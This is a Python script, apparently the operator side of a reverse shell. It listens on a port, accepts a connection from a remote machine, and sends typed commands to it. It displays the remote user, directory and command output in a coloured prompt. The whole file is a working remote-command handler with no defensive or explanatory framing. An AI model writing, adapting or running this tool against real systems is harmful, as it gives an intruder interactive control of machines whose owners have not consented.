import socket, os, sys, argparse, subprocess
from termcolor import colored
from datetime import datetime

def get_args(): 
    parser = argparse.ArgumentParser()
    parser.add_argument('-p','--port',dest='port', default=1337, required=False, type=int,
                        help="Port to listen on")
    return parser.parse_args()

def create_socket(host, port):
    try:
        s = socket.socket()
        s.bind((host, port))
        s.listen(5)
        print(colored(f"[*] Listening on {host}:{port}", 'green', attrs=['bold']))
        print("-" * 50)
        client_con, client_info = s.accept()
        print(colored(f"\n[*] Recieved a connection from {client_info[0]}:{client_info[1]}", 'green', attrs=['bold']))
        send_commands(client_con)
        client_con.close()
        s.close()
        print(colored(f"[*] Connection closed successfully", 'green', attrs=['bold']))
        
    except socket.error as e:
        print(colored(f"[!] Error (occured at socket processing): {e}",'red', attrs=['bold']))        

def send_commands(client_con):
    cwd = client_con.recv(buffer_size).decode()
    whoami = client_con.recv(buffer_size).decode()
    os_name = os.name  # Retrieve the operating system name using os.name

    if os_name == "nt":  # Check the OS name to clear screen accordingly
        subprocess.run('cls', shell=True)  # Clear screen for Windows
    else:
        subprocess.run('clear', shell=True)  # Clear screen for Unix-based systems

    while True:
        try:
            cmd = beautiful_terminal(whoami, cwd)  # Use the beautify_terminal function to get commands
            if len(cmd.encode()) > 0:
                client_con.send(cmd.encode())
            else:
                continue
            if cmd.lower() == 'quit':
                break
            results, cwd, whoami = client_con.recv(buffer_size).decode().split(separator)
            print(colored(results, attrs=['dark']))
        except KeyboardInterrupt:
            client_con.send('quit'.encode())
            print("\nGood Bye!")
            break

    
def beautiful_terminal(whoami,cwd):
    print(colored(f" {whoami} on ",'green',attrs=['bold']),end="")
    print(colored(f" [{cwd}]",'blue',attrs=['dark']),end=" at ")
    print(colored(f"[{datetime.now().strftime('%H:%M:%S')}]",'magenta'))
    print(colored("# ",'red'),end="")
    cmd=input().strip()
    return cmd


if __name__ == "__main__":
    arguments = get_args()
    host_ip = "0.0.0.0"
    buffer_size = 1024 * 256 # => 256kb
    separator = "<sep>"
    host_port = arguments.port
    create_socket(host_ip, host_port)